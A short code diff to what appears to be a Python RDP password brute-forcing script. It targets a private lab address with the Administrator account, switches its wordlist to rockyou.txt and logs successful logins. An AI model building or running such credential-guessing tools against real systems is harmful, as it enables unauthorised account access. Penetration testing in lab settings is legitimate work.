@@ -4,7 +4,7 @@ import time
 # Replace with your target IP and wordlist
 target_ip = "192.168.56.101"
 username = "Administrator"
-wordlist_path = "shortlist.txt"
+wordlist_path = "/usr/share/wordlists/rockyou.txt"
 success_log = "rdp_success.txt"
 
 def attempt_login(password):
